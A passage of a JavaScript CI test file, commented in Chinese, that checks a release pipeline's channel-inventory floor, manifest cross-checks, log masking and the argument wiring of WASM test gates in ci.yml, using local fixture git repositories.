        + JSON.stringify(networkGitLines.filter(line => !/2>\s*"\$[A-Z_]+"/u.test(line))),
    )
    const reportCalls = codeLines.filter(line => /^\s*report_git_failure\s+"/u.test(line))
    check(
      reportCalls.length === 3,
      `捕获 + 脱敏 + 分类必须收在唯一的 report_git_failure 上（三条 git 路径各一处调用），实际 ${reportCalls.length}: ${JSON.stringify(reportCalls)}`,
    )
    const classifierHeads = codeLines.filter(line => /^\s*case "\$errlines" in/u.test(line))
    check(
      classifierHeads.length === 1,
      `症状分类只能有一份实现（两份必然漂移，且新调用点会漏分类），实际 ${classifierHeads.length}`,
    )
    // `LC_ALL=C`：git/ssh 的报错文案随 locale 变，而分类按英文片段匹配（R8-D-10）。
    check(
      codeLines.some(line => /^\s*export LC_ALL=C\s*$/u.test(line)),
      '必须显式 `export LC_ALL=C`：否则非英文 runner 上 git 的中文报错会让整条分类静默失效（R8-D-10）',
    )
    // pin 形状判据必须锚定**整值**（`grep -x` 只锚定"行"，挡不住多行值）。
    check(
      codeLines.some(line => /grep -Eqx '\[0-9a-f\]\{40\}'/u.test(line)),
      "pin 形状判据必须用 `grep -Eqx '[0-9a-f]{40}'`（整行锚定）+ 多行值显式拒绝（R8-D-13）",
    )
    check(
      codeLines.some(line => /tr -d '\\r\\n'/u.test(line)),
      'pin 值必须先做换行归一化（\\r 与 \\n），否则多行注入会一路走到"pin 不存在"才失败（R8-D-13）',
    )
    // 私钥落盘必须先收 umask（裸 `>` 重定向按 022 建文件 ⇒ 0644 窗口，R8-D-12）。
    check(
      codeLines.some(line => /umask 077/u.test(line)),
      '私钥落盘必须先 umask 077（否则 chmod 之前存在世界可读窗口，R8-D-12）',
    )
  }
}

// ---- 1i. "应有渠道集":目录数下限 + 渠道仓自带清单（2026-09-24 第八轮审计 R8-C-7）----
//
// 现场（REPRODUCED）：`channel_set=all`（正式 tag）的语义是"发一个正式版 = 所有渠道都发布"，
// 但"所有" = **渠道仓本次 revision 里恰好存在的那些目录**。从渠道仓删掉一个渠道目录（或克隆
// 不完整 / 改名）之后，脚本打出 `channels selected: N of N` 并 **EXIT=0** —— 那个客户拿不到
// 任何交付物（品牌渠道的唯一分发面是更新服务器，GitHub Release 不含它们），全程零红灯。
//
// 两层判据，**都不在公开仓里写任何渠道身份**（铁律 0）：
//   ① 兜底（始终生效）：`MIN_EXPECTED_CHANNELS` = 渠道目录数下限（只是一个数字 —— 渠道数
//      本来就已经打在公开日志里）。正式 tag 跌破 = 红；正式 tag 之外只告警（预发/PR 线上
//      渠道正在上下线时不该阻断无关构建，但必须看得见）；多于下限 = 告警提示同步棘轮。
//   ② 权威（可选）：渠道仓根目录的 `channels.manifest.json`（id 留在私有仓）与枚举结果
//      **双向**对拍：登记了却没有目录 = 红（会少发）；有目录却没登记 = 红（未评审的新渠道）。
// 另有 `--list` 的内容对拍：下游四个 job 只按它构建/搬运/发布，少一行就是少一个交付物。
{
  // 棘轮：下限可以上调，**下调必须是一次显式评审**。这里把"不得低于 4"钉进判据
  // （改这条断言 = 一次可见的 diff），否则把它调到 1 就等于把闸门关掉。
  check(
    channelFloor() >= 4,
    `MIN_EXPECTED_CHANNELS 是渠道目录数的棘轮下限，不得低于 4（真实渠道仓的目录数下限）；实际 ${channelFloor()}`,
  )

  const stableTag = { refName: 'v9.9.9', ref: 'refs/tags/v9.9.9' }
  const branchRef = { refName: 'ci-probe', ref: 'refs/heads/ci-probe' }

  // ① 正式 tag + 目录数正好等于下限 ⇒ 通过，且 `--list` 必须**逐行等于**目录全集
  //    （少一行 = 下游少构建/少交付一个渠道；这条同时是"选择集被截断"的判据）。
  {
    const source = fakeChannelRepo(['official', 'beta', 'example-brand', 'example-ops'])
    const expected = orderedChannelIds(source)
    check(expected.length === channelFloor(), `夹具前置：目录数应正好等于下限，实际 ${expected.length}`)
    const run = runChannels({ source, ...stableTag, dest: 'channels', list: 'c7-full.list' })
    check(run.status === 0, `目录数等于下限的正式 tag 必须通过，实际 ${String(run.status)}：${run.stderr}`)
    check(
      JSON.stringify(run.selected) === JSON.stringify(expected),
      `正式 tag 必须选中全部渠道，实际 ${JSON.stringify(run.selected)}`,
    )
    check(
      JSON.stringify(readFileSync(run.listPath, 'utf8').split('\n').filter(Boolean)) === JSON.stringify(expected),
      `--list 必须逐行等于选中渠道（下游四个 job 只按它构建/搬运/发布，少一行就是少一个交付物），`
        + `实际 ${JSON.stringify(readFileSync(run.listPath, 'utf8').split('\n').filter(Boolean))}`,
    )
    check(
      `${run.stderr ?? ''}`.includes('channels.manifest.json'),
      `渠道仓没有权威清单时必须留一行说明"只有目录数下限在兜底"（不得静默少一层判据），实际：${run.stderr ?? ''}`,
    )
  }

  // ② **夹具/本地检出路径**（`CI_CHANNELS_SOURCE`）不得被下限提前中止
  //    （2026-09-24 集成回归）：本仓两个守卫（`scripts/verify-wasm-channels.mjs` 的组 7 与
  //    本文件）都用这个模式跑合成夹具，夹具目录数（3 个）天然小于真实渠道仓下限（4 个）。
  //    若在这里判红，**逐渠道字段校验就永远看不到自己的错误** —— 实测组 7 七条断言全红。
  //    豁免只给这个模式；生产（clone/pin）那一半由 ⑪ 用真 git 仓库验。
  {
    const source = fakeChannelRepo(['official', 'beta', 'example-brand', 'example-ops'])
    rmSync(join(source, 'channels', 'example-brand'), { recursive: true, force: true })
    const run = runChannels({ source, ...stableTag, dest: 'channels', list: 'c7-source-shrunk.list' })
    check(
      run.status === 0,
      `本地检出模式(CI_CHANNELS_SOURCE)下目录数不足不得阻断（否则夹具里逐渠道字段校验全被吞掉），实际 exit=${String(run.status)}：${run.stderr}`,
    )
    check(
      `${run.stderr ?? ''}`.includes('跳过「渠道目录数下限」判定'),
      `本地检出模式必须留一行说明"下限判据本次不适用"（不得静默少一层判据），实际：${run.stderr ?? ''}`,
    )
    check(existsSync(run.listPath), '本地检出模式下 --list 仍必须写出（下游步骤按它构建）')

    // ②b 同一份"目录数不足"的夹具 + 某渠道字段非法 ⇒ 报错必须**点名那个字段**
    //     （组 7 的最小复刻：这正是被下限吞掉的那类断言）
    const broken = fakeChannelRepo(['official', 'beta', 'example-brand', 'example-ops'])
    rmSync(join(broken, 'channels', 'example-brand'), { recursive: true, force: true })
    writeFileSync(join(broken, 'channels', 'official', 'channel.json'), JSON.stringify({
      schema: 1,
      channel_id: 'official',
      identity: { display_name: 'Official', short_name: 'Official' },
      desktop: {}, // 缺 desktop.app_origin_scheme（组 7 的第一条负例）
    }))
    const brokenRun = runChannels({ source: broken, ...stableTag, dest: 'channels', list: 'c7-source-field.list' })
    check(
      brokenRun.status !== 0 && `${brokenRun.stderr ?? ''}`.includes('desktop.app_origin_scheme'),
      `目录数不足时逐渠道字段校验仍必须可见（报错要点名字段，而不是"渠道数不足"），实际 exit=${String(brokenRun.status)}：${brokenRun.stderr ?? ''}`,
    )
    check(
      !`${brokenRun.stderr ?? ''}`.includes('少于登记下限'),
      '本地检出模式下不得出现"少于登记下限"（那就是把逐渠道校验吞掉的形态）',
    )
  }

  // ③ **生产路径**（clone + pin）+ 删掉一个渠道目录 ⇒ **正式 tag 必须红**（本次审计的现场形态）。
  //    与 ② 的差别只有"内容从哪来"：这条走的正是 ci.yml 四个调用点的形态。
  //    同时判"失败时不得写出 --list"（下游拿到列表就会继续构建）。
  {
    const repo = fixtureRepo()
    for (const id of ['official', 'example-brand', 'example-ops', 'zeta']) {
      mkdirSync(join(repo, 'channels', id), { recursive: true })
      writeFileSync(join(repo, 'channels', id, 'channel.json'), JSON.stringify({
        schema: 1,
        channel_id: id,
        identity: { display_name: `${id} AI`, short_name: id },
        desktop: id === 'official'
          ? { app_origin_scheme: 'picoaide-app' }
          : {
              product_name: `${id} AI`,
              slug: `${id}-AI`,
              app_id: `com.example.${id.replaceAll('-', '')}`,
              deep_link_scheme: `${id.replaceAll('-', '')}link`,
              home_dir: `.${id}-harness`,
              app_origin_scheme: `${id.replaceAll('-', '')}-app`,
            },
      }))
    }
    fixtureCommit(repo, 'channels/official/README.md', 'full inventory', '2026-09-01T10:00:00+08:00')
    const fullRev = fixtureMustGit(repo, ['rev-parse', 'HEAD'])
    // 先删一个目录并提交，再 pin 到那个 revision（生产路径的实际形态：pin 指向的树里少一个渠道）
    rmSync(join(repo, 'channels', 'example-brand'), { recursive: true, force: true })
    fixtureCommit(repo, 'channels/official/README.md', 'drop a channel', '2026-09-02T10:00:00+08:00')
    const shrunkRev = fixtureMustGit(repo, ['rev-parse', 'HEAD'])
    const run = runChannels({
      source: undefined, ...stableTag, dest: 'channels', list: 'c7-prod-shrunk.list',
      env: { CI_CHANNELS_URL: `file://${repo}`, CI_CHANNELS_PIN: shrunkRev },
    })
    check(
      run.status !== 0,
      `生产路径(clone+pin)上正式 tag 的渠道目录数少于下限必须 fail-loud（否则会静默少发一个渠道），实际 exit=${String(run.status)}：${run.stderr}`,
    )
    check(
      `${run.stderr ?? ''}`.includes('少于登记下限'),
      `生产路径的失败信息必须点名"少于登记下限"，实际：${run.stderr ?? ''}`,
    )
    check(!existsSync(run.listPath), '失败时不得写出渠道列表（下游步骤拿到它就会继续构建）')
    check(!/\b(example-brand|example-ops|zeta)\b/u.test(run.stderr ?? ''), '下限判据只报数字，不得回显渠道名')
    // 同一份仓、同一个 pin、非 tag ⇒ 只告警（分档语义在生产路径上同样成立）
    const branchRun = runChannels({
      source: undefined, ...branchRef, dest: 'channels', list: 'c7-prod-branch.list',
      env: { CI_CHANNELS_URL: `file://${repo}`, CI_CHANNELS_PIN: shrunkRev },
    })
    check(
      branchRun.status === 0 && `${branchRun.stderr ?? ''}`.includes('少于登记下限'),
      `生产路径的非 tag 上目录数不足只应告警，实际 exit=${String(branchRun.status)}：${branchRun.stderr ?? ''}`,
    )
    // 目录数**多于**下限（新增渠道未同步棘轮）⇒ 告警，不阻断
    const moreRepo = fixtureRepo()
    // 注意别用 `orderedChannelIds(repo)`：那个夹具刚被删掉一个渠道，会算出"正好等于下限"。
    const moreIds = ['official', 'example-brand', 'example-ops', 'zeta', 'example-new']
    for (const id of moreIds) {
      mkdirSync(join(moreRepo, 'channels', id), { recursive: true })
      writeFileSync(join(moreRepo, 'channels', id, 'channel.json'), JSON.stringify({
        schema: 1,
        channel_id: id,
        identity: { display_name: `${id} AI`, short_name: id },
        desktop: id === 'official'
          ? { app_origin_scheme: 'picoaide-app' }
          : {
              product_name: `${id} AI`,
              slug: `${id}-AI`,
              app_id: `com.example.${id.replaceAll('-', '')}`,
              deep_link_scheme: `${id.replaceAll('-', '')}link`,
              home_dir: `.${id}-harness`,
              app_origin_scheme: `${id.replaceAll('-', '')}-app`,
            },
      }))
    }
    fixtureCommit(moreRepo, 'channels/official/README.md', 'one more channel', '2026-09-01T10:00:00+08:00')
    const moreRev = fixtureMustGit(moreRepo, ['rev-parse', 'HEAD'])
    const moreRun = runChannels({
      source: undefined, ...stableTag, dest: 'channels', list: 'c7-prod-more.list',
      env: { CI_CHANNELS_URL: `file://${moreRepo}`, CI_CHANNELS_PIN: moreRev },
    })
    check(moreRun.status === 0, `多于下限不该阻断发布（新渠道该发），实际 ${String(moreRun.status)}：${moreRun.stderr}`)
    check(
      `${moreRun.stderr ?? ''}`.includes('多于登记下限'),
      `多于下限必须提示同步棘轮常量，实际：${moreRun.stderr ?? ''}`,
    )
    check(fullRev !== shrunkRev, '夹具前置：pin 判据需要两个不同 revision')
  }

  // ③b 静态接线：**没有任何 workflow 设置 CI_CHANNELS_SOURCE** —— 下限判据的豁免只给本地/夹具
  //     模式，生产链（四个调用点）必须始终走 clone/pin，否则"静默缩小 ⇒ 红"会被一条 env 关掉。
  {
    const workflow = readFileSync(join(root, '.github', 'workflows', 'ci.yml'), 'utf8')
    const codeLines = workflow.split('\n').filter(line => !line.trimStart().startsWith('#'))
    check(
      !codeLines.some(line => line.includes('CI_CHANNELS_SOURCE')),
      'workflow 不得设置 CI_CHANNELS_SOURCE（那是本地/夹具模式，会绕过渠道目录数下限判据）',
    )
  }

  // ⑤ 权威清单：与目录集一致 ⇒ 通过。
  {
    const source = fakeChannelRepo(['official', 'beta', 'example-brand', 'example-ops'])
    writeFileSync(join(source, 'channels.manifest.json'),
      `${JSON.stringify({ schema: 1, channels: orderedChannelIds(source) })}\n`)
    const run = runChannels({ source, ...stableTag, dest: 'channels', list: 'c7-manifest-ok.list' })
    check(run.status === 0, `清单与目录集一致时必须通过，实际 ${String(run.status)}：${run.stderr}`)
    check(
      `${run.stderr ?? ''}`.includes('channels manifest verified'),
      `清单对拍通过时必须留一行可审计的结论，实际：${run.stderr ?? ''}`,
    )
  }

  // ⑥ 权威清单声明了一个仓库里**没有**的渠道 ⇒ 红，并**点名缺了谁**。
  //    id 先登记掩码再打印、且两条都走 stderr（跨流的先后顺序没有保证，先打未掩码的 id
  //    就是一次公开日志泄露）。
  {
    const source = fakeChannelRepo(['official', 'beta', 'example-brand', 'example-ops'])
    const ghost = 'ghost-channel'
    writeFileSync(join(source, 'channels.manifest.json'),
      `${JSON.stringify({ schema: 1, channels: [...orderedChannelIds(source), ghost] })}\n`)
    const run = runChannels({ source, ...stableTag, dest: 'channels', list: 'c7-manifest-missing.list' })
    const err = `${run.stderr ?? ''}`
    check(run.status !== 0, '清单声明的渠道在仓库里没有对应目录时必须 fail-loud（正式 tag 会少发）')
    check(err.includes(`::add-mask::${ghost}`), `缺失渠道的 id 必须先登记掩码，实际：${err}`)
    check(err.includes('缺失：') && err.includes(ghost), `失败信息必须点名缺了谁（本地可读；CI 里已被掩码），实际：${err}`)
    check(
      err.indexOf(`::add-mask::${ghost}`) < err.indexOf(`缺失：${ghost}`),
      '掩码指令必须**先于**取值出现（GitHub 只对之后的输出生效）',
    )
    check(!`${run.stdout ?? ''}`.includes(ghost), '掩码与报错都走 stderr，不得写到 stdout（stdout 有别的消费方）')
    check(!existsSync(run.listPath), '清单对拍失败时不得写出渠道列表')
  }

  // ⑦ 反向：仓库里有目录但**没登记**进清单 ⇒ 红（未评审的新渠道 —— 它将来被删掉无人发现）。
  {
    const source = fakeChannelRepo(['official', 'beta', 'example-brand', 'example-ops'])
    const registered = orderedChannelIds(source).filter(id => id !== 'example-ops')
    writeFileSync(join(source, 'channels.manifest.json'),
      `${JSON.stringify({ schema: 1, channels: registered })}\n`)
    const run = runChannels({ source, ...stableTag, dest: 'channels', list: 'c7-manifest-extra.list' })
    const err = `${run.stderr ?? ''}`
    check(run.status !== 0, '有渠道目录未登记进清单时必须 fail-loud（否则它消失时没有任何判据）')
    check(err.includes('未登记') && err.includes('example-ops'), `失败信息必须点名未登记的渠道，实际：${err}`)
  }

  // ⑧ 清单坏了（非法 JSON / 空数组）⇒ 红：**绝不静默退回**"只有下限兜底"
  //    （否则把清单改坏就是关掉闸门的最短路径）。
  for (const [content, why] of [['{ not json', '非法 JSON'], ['{"schema":1,"channels":[]}', '空数组']]) {
    const source = fakeChannelRepo(['official', 'beta', 'example-brand', 'example-ops'])
    writeFileSync(join(source, 'channels.manifest.json'), `${content}\n`)
    const run = runChannels({ source, ...stableTag, dest: 'channels', list: 'c7-manifest-bad.list' })
    check(run.status !== 0, `清单${why}时必须 fail-loud（不得静默降级成只查下限）`)
    check(
      `${run.stderr ?? ''}`.includes('channels.manifest.json'),
      `清单${why}的失败信息必须点名那个文件`,
    )
  }

  // ⑨ 权威清单是**仓库级**配置：非 tag 的 PR/分支构建上不一致同样要红
  //    （那是仓库状态自相矛盾，与本次构建的渠道集无关）。
  {
    const source = fakeChannelRepo(['official', 'beta', 'example-brand', 'example-ops'])
    writeFileSync(join(source, 'channels.manifest.json'),
      `${JSON.stringify({ schema: 1, channels: [...orderedChannelIds(source), 'ghost-channel'] })}\n`)
    const run = runChannels({ source, ...branchRef, dest: 'channels', list: 'c7-manifest-branch.list' })
    check(run.status !== 0, '非 tag 上清单与目录集不一致也必须红（配置自相矛盾）')
  }

  // ⑩ 静态接线：`--list` 写完后必须复核行数（写盘不完整 / 被并发改写 = 下游少构建一个渠道）。
  //    这一条用源码级判据，是因为触发它需要真的把写盘弄坏（正常路径下写出来的永远是对的长度）——
  //    "应有集合"本身由 ①/②/③ 与下面的克隆路径用例守住，这里只钉住那道复核没有被删掉。
  {
    const text = readFileSync(channelsScript, 'utf8')
    check(
      /LIST_LINES="\$\(grep -c/u.test(text) && /-ne "\$\{#SELECTED\[@\]\}"/u.test(text),
      '--list 写入后必须复核行数 === 选中渠道数（写盘不完整时下游会静默少交付一个渠道）',
    )
  }

  // ⑪ **生产路径**（clone + pin，ci.yml 四个调用点走的形态）上同样成立：
  //    删一个渠道目录并提交 ⇒ pin 到新 revision 的正式 tag 构建必须红。
  //    只用 source 模式测会漏掉"判据挂在 `CHECKOUT_ROOT` 上，而克隆路径下那个变量指错"这类缺口。
  {
    const repo = fixtureRepo()
    const ids = ['official', 'example-brand', 'example-ops', 'zeta']
    for (const id of ids) {
      mkdirSync(join(repo, 'channels', id), { recursive: true })
      const publicChannel = id === 'official'
      writeFileSync(join(repo, 'channels', id, 'channel.json'), JSON.stringify({
        schema: 1,
        channel_id: id,
        identity: { display_name: `${id} AI`, short_name: id },
        desktop: publicChannel
          ? { app_origin_scheme: 'picoaide-app' }
          : {
              product_name: `${id} AI`,
              slug: `${id}-AI`,
              app_id: `com.example.${id.replaceAll('-', '')}`,
              deep_link_scheme: `${id.replaceAll('-', '')}link`,
              home_dir: `.${id}-harness`,
              app_origin_scheme: `${id.replaceAll('-', '')}-app`,
            },
      }))
    }
    check(orderedChannelIds(repo).length === channelFloor(), '夹具前置：克隆用例的目录数应正好等于下限')
    fixtureCommit(repo, 'channels/official/README.md', 'full inventory', '2026-09-01T10:00:00+08:00')
    const fullRev = fixtureMustGit(repo, ['rev-parse', 'HEAD'])
    const url = `file://${repo}`
    const okRun = runChannels({
      source: undefined, ...stableTag, dest: 'channels', list: 'c7-clone-full.list',
      env: { CI_CHANNELS_URL: url, CI_CHANNELS_PIN: fullRev },
    })
    check(okRun.status === 0, `克隆路径 + 目录数等于下限必须通过，实际 ${String(okRun.status)}：${okRun.stderr}`)
    check(
      JSON.stringify(okRun.selected) === JSON.stringify(orderedChannelIds(repo)),
      `克隆路径的渠道集必须等于仓库目录集，实际 ${JSON.stringify(okRun.selected)}`,
    )
    // 权威清单在**克隆路径**下也要被读到（路径解析错 = 判据静默失效）。
    writeFileSync(join(repo, 'channels.manifest.json'),
      `${JSON.stringify({ schema: 1, channels: [...orderedChannelIds(repo), 'ghost-channel'] })}\n`)
    fixtureMustGit(repo, ['add', '-A'])
    fixtureMustGit(repo, ['commit', '-q', '-m', 'manifest'], {
      GIT_AUTHOR_DATE: '2026-09-02T10:00:00+08:00', GIT_COMMITTER_DATE: '2026-09-02T10:00:00+08:00',
    })
    const manifestRev = fixtureMustGit(repo, ['rev-parse', 'HEAD'])
    const manifestRun = runChannels({
      source: undefined, ...stableTag, dest: 'channels', list: 'c7-clone-manifest.list',
      env: { CI_CHANNELS_URL: url, CI_CHANNELS_PIN: manifestRev },
    })
    check(
      manifestRun.status !== 0 && `${manifestRun.stderr ?? ''}`.includes('ghost-channel'),
      `克隆路径下渠道仓清单必须被读到并对拍（路径解析错就是判据静默失效），实际：${manifestRun.stderr ?? ''}`,
    )
    // 再删一个渠道目录并提交 ⇒ pin 到新 revision 的正式 tag 必须红。
    rmSync(join(repo, 'channels', 'example-brand'), { recursive: true, force: true })
    rmSync(join(repo, 'channels.manifest.json'), { force: true })
    fixtureCommit(repo, 'channels/official/README.md', 'drop a channel', '2026-09-03T10:00:00+08:00')
    const shrunkRev = fixtureMustGit(repo, ['rev-parse', 'HEAD'])
    const shrunkRun = runChannels({
      source: undefined, ...stableTag, dest: 'channels', list: 'c7-clone-shrunk.list',
      env: { CI_CHANNELS_URL: url, CI_CHANNELS_PIN: shrunkRev },
    })
    check(shrunkRun.status !== 0, '克隆路径下（生产形态）渠道目录数少于下限必须红')
    check(
      `${shrunkRun.stderr ?? ''}`.includes('少于登记下限'),
      `生产形态的失败信息必须点名"少于登记下限"，实际：${shrunkRun.stderr ?? ''}`,
    )
  }
}

// ---- 1d. WASM 门禁接线:真跑 W-4 判定脚本的**接线参数**(2026-09-23 审计 W-4/W-5) ----
//
// 现场:两条判据的脚本侧早就存在(`scripts/wasm/check-go-test-json.mjs` 与
// `scripts/verify-wasm-client-only.sh --groups 6`),但 `.github/` 对它们 0 引用 ⇒
// "从不执行"。接线最容易的退化是**把参数改松**:`--require` 只留一条必然通过的用例、
// 或把 `--scope` 去掉(整份报告都判 ⇒ `internal/serverstore` 的 DST 用例在 UTC runner
// 上必然 t.Skip ⇒ 每次必红的假红,而假红的下场通常是关掉判据)。
//
// 这一组**从 ci.yml 抽出真实 argv**再跑真脚本(合成报告,不跑 Go):
//   ① 范围外的用例级 skip 不得影响结论(证明 --scope 真的在过滤);
//   ② 范围内的用例级 skip 必须判红;
//   ③ 报告缺失必须 exit 2(而不是"没有命中");
//   ④ `--require` 三条关键用例必须都在报告里 pass 才绿。
{
  const workflowText = readFileSync(join(root, '.github', 'workflows', 'ci.yml'), 'utf8')
  const blocks = extractRunBlocks(workflowText)
  const caseGateBlock = blocks.find(entry => entry.content.includes('check-go-test-json.mjs'))
  check(caseGateBlock !== undefined, 'ci.yml 里找不到 W-4 的用例级判定步骤(接线被删?)')
  const probeBlock = blocks.find(entry => entry.content.includes('verify-wasm-client-only.sh'))
  check(probeBlock !== undefined, 'ci.yml 里找不到 W-5 的协议探针步骤(接线被删?)')

  if (caseGateBlock !== undefined) {
    const text = caseGateBlock.content
    const scope = /--scope\s+(\S+)/u.exec(text)?.[1]
    const required = /--require\s+(\S+)/u.exec(text)?.[1]?.split(',').map(name => name.trim()).filter(Boolean) ?? []
    const goTest = /go\s+test\b[^\n]*?-json[^\n]*?>\s*([^\s;&|]+)/u.exec(text)
    const reportArg = /check-go-test-json\.mjs\s+([^\s\\]+)/u.exec(text)?.[1]
    // 登记值必须与 `scripts/check-workflows.mjs` 的 `WASM_CASE_GATE_SCOPE` 同一份取值:
    // 前两段与组 3 同面,后两段(F8,2026-09-23)是 A-8 渠道守卫用例所在的包 ——
    // 那两个包的用例依赖真 PG,PG 不可达时整包 `t.Skip`,不纳入判定面就等于没有守卫。
    check(scope === 'internal/wasmapp,internal/router,internal/marketplace,internal/agentshare', `W-4 的 --scope 应为 internal/wasmapp,internal/router,internal/marketplace,internal/agentshare(不带尾斜杠:带了会漏掉 internal/router 根包的用例事件),实际 ${String(scope)}`)
    check(goTest !== null && reportArg !== undefined && goTest[1] === reportArg,
      `W-4 的报告路径必须与 go test -json 的落盘路径一致(实际落盘 ${String(goTest?.[1])} / 读取 ${String(reportArg)})`)
    check(required.length === 3, `W-4 的 --require 必须是三条关键用例,实际 ${required.length} 条:${required.join(', ')}`)
    check(/exit\s+[1-9]/u.test(text), 'W-4 的步骤必须把判定收口成 exit 1(checker 的 1/2 都要变成失败)')

    if (scope !== undefined && required.length > 0) {
      const scopeArgs = ['--scope', scope]
      const requireArgs = ['--require', required.join(',')]
      const cases = required.map(name => ({ Action: 'pass', Package: 'picoaide/server/internal/wasmapp/appserver', Test: name }))
      const cleanReport = [
        ...cases.map(entry => JSON.stringify(entry)),
        JSON.stringify({ Action: 'pass', Package: 'picoaide/server/internal/wasmapp/appserver' }),
      ].join('\n')
      // 范围外(serverstore)的用例级 skip:在 --scope 下必须**不影响**结论。
      const outsideSkip = `${cleanReport}\n${JSON.stringify({ Action: 'skip', Package: 'picoaide/server/internal/serverstore', Test: 'TestSummarizeWasmAppOpensTrendUVAcrossDSTDay' })}`
      // 范围内(appserver)的用例级 skip:必须判红。
      const insideSkip = `${cleanReport}\n${JSON.stringify({ Action: 'skip', Package: 'picoaide/server/internal/wasmapp/appserver', Test: 'TestSomethingSkipped' })}`

      const dir = tempDir('wasm-case-gate-')
      const write = (name, content) => {
        const path = join(dir, name)
        writeFileSync(path, content)
        return path
      }
      const runChecker = reportPath => spawnSync(
        'node',
        ['scripts/wasm/check-go-test-json.mjs', reportPath, ...scopeArgs, ...requireArgs],
        { cwd: root, encoding: 'utf8' },
      )

      const clean = runChecker(write('clean.json', cleanReport))
      check(clean.status === 0, `区间内干净报告应通过,实际退出 ${String(clean.status)}: ${(clean.stderr ?? '').slice(0, 200)}`)
      const outOfScope = runChecker(write('outside-skip.json', outsideSkip))
      check(outOfScope.status === 0,
        `--scope 必须忽略范围外的用例级 skip,实际退出 ${String(outOfScope.status)}: ${(outOfScope.stderr ?? '').slice(0, 200)}`)
      const inScope = runChecker(write('inside-skip.json', insideSkip))
      check(inScope.status === 1, `范围外的用例级 skip 必须判红(exit 1),实际退出 ${String(inScope.status)}`)
      const missing = runChecker(join(dir, 'does-not-exist.json'))
      check(missing.status === 2, `报告缺失必须 exit 2(前置缺失),实际退出 ${String(missing.status)}`)
      // 缺一条关键用例 ⇒ 判红(证明 --require 的名单真的在判)。
      const dropped = required[required.length - 1]
      const missingCase = runChecker(write('missing-case.json', [
        ...cases.filter(entry => entry.Test !== dropped).map(entry => JSON.stringify(entry)),
        JSON.stringify({ Action: 'pass', Package: 'picoaide/server/internal/wasmapp/appserver' }),
      ].join('\n')))
      check(missingCase.status === 1, `少一条关键用例(${dropped})必须判红,实际退出 ${String(missingCase.status)}`)
    }
  }

  // W-5:探针步骤的参数级断言(真跑 21s 的探针属于"本地/CI 实跑"面,这里只钉参数)。
  if (probeBlock !== undefined) {
    const text = probeBlock.content
    check(/verify-wasm-client-only\.sh\s+--groups\s+6(?!\d)/u.test(text),
      `W-5 必须跑 --groups 6(协议探针),实际:${text.split('\n').find(line => line.includes('verify-wasm-client-only')) ?? '(无)'}`)
    check(workflowText.includes('WASM_GATE_REQUIRE_COVERED_PLATFORM'),
      'W-5 必须带 WASM_GATE_REQUIRE_COVERED_PLATFORM(非覆盖平台显式 SKIP(77),不给"跑完给结论")')
    check(/WASM_GATE_REQUIRE_COVERED_PLATFORM:\s*['"]1['"]/u.test(workflowText),
      'WASM_GATE_REQUIRE_COVERED_PLATFORM 必须写死为 \'1\'(由 tag/平台派生的开关会让它退化成"跑完给结论")')
  }

  // ---- W-8 接线:门禁结论必须绑定权威 HEAD(2026-09-23 第三轮审计的收口) ----
  //
  // 现场:`scripts/verify-wasm-client-only.sh` 早就支持 `WASM_GATE_EXPECT_HEAD`(跑前锁定
  // 期望 HEAD,不匹配即**跑前**退出码 2 + 「结论不可比」),而 `.github/` 从不设置它 ⇒
  // 又一次"有能力、没接线":换 commit / 脏树 / 跑动中被推进 HEAD,都能拿到同一句
  // "全部通过 ✅(绑定 HEAD …)"。
  //
  // 这一组做两件事(静态 + 动态,缺一不可):
  //   ① 静态:从 ci.yml 的 **step `env:`**(YAML 解析,不是全文子串匹配)里取出跑这个门禁的
  //      每一步的期望 HEAD 取值,断言恰好是 `${{ github.sha }}`;
  //   ② 动态:把从 ci.yml 抽出来的**变量名**与一个形状合法、但不等于当前 HEAD 的 sha 交给
  //      **真脚本**,断言它以退出码 2 拒绝并打印「结论不可比」—— 这一步证明"名字真的被脚本认"
  //      (改名 / 打错字这类静默失效在这里当场红),而不是只证明 YAML 里有一行像样的文本。
  {
    const EXPECT_HEAD_ENV = 'WASM_GATE_EXPECT_HEAD'
    const EXPECT_HEAD_VALUE = '${{ github.sha }}'
    const document = parseYaml(workflowText)
    const jobs = typeof document?.jobs === 'object' && document.jobs !== null ? document.jobs : {}
    /** 去掉行尾注释(`#` 之后的文本),与门禁自己的可执行文本口径一致。 */
    const strippedRun = step => (typeof step?.run === 'string'
      ? step.run.split('\n').map(line => line.replace(/(?:^|\s)#.*$/u, '')).join('\n')
      : '')
    /** 直接跑 WASM 门禁的 step(探针步 / 将来新增的入口)。 */
    const directSteps = []
    /** 跑整仓门禁的 step(`yarn check`,经 check:wasm-client-only 间接跑同一门禁)。 */
    const fullGateSteps = []
    for (const [jobId, job] of Object.entries(jobs)) {
      const steps = Array.isArray(job?.steps) ? job.steps : []
      steps.forEach((step, index) => {
        const script = strippedRun(step)
        const label = `job ${jobId} 的 step「${typeof step?.name === 'string' && step.name.trim() !== '' ? step.name : `第 ${index + 1} 步`}」`
        if (script.includes('verify-wasm-client-only.sh')) directSteps.push({ label, step })
        if (/yarn\s+check(?![\w:.-])/u.test(script)) fullGateSteps.push({ label, step })
      })
    }
    check(directSteps.length > 0, 'ci.yml 里找不到直接跑 verify-wasm-client-only.sh 的步骤(W-8 的接线对象没了)')
    check(fullGateSteps.length > 0, 'ci.yml 里找不到跑全量根门禁(`yarn check`)的步骤(W-8 的接线对象没了)')
    const expectedValue = value => (typeof value === 'string' ? value.trim() : String(value ?? '').trim())
    let observedEnvName = null
    for (const { label, step } of [...directSteps, ...fullGateSteps]) {
      const env = typeof step?.env === 'object' && step.env !== null ? step.env : {}
      const raw = env[EXPECT_HEAD_ENV]
      check(raw !== undefined && expectedValue(raw) === EXPECT_HEAD_VALUE,
        `${label} 的 step env 必须带 ${EXPECT_HEAD_ENV}: ${EXPECT_HEAD_VALUE}`
        + `(实际 ${raw === undefined ? '缺失' : JSON.stringify(raw)})`
        + ' —— 缺它不是"少一层保险",而是本次结论不绑任何权威 HEAD(换 commit 也照样说"全部通过")')
      // 变量名从 ci.yml 里**抽出来**给动态断言用(而不是在测试里再写一遍字面量:
      // 那样"CI 与脚本对不上"这种形态会被测试自己的字面量掩盖)。
      if (raw !== undefined) observedEnvName = EXPECT_HEAD_ENV
    }
    // 动态:真脚本必须认这个名字,且必须在**跑任何一组之前**就以退出码 2 拒绝。
    // sha 形状合法(40 位小写十六进制)但按构造不可能等于 HEAD ⇒ 走到"结论不可比"分支;
    // 顺手断言它**没有**执行任何组(输出里不出现组标题),证明这是前置拒绝而非跑完才发现。
    if (observedEnvName !== null) {
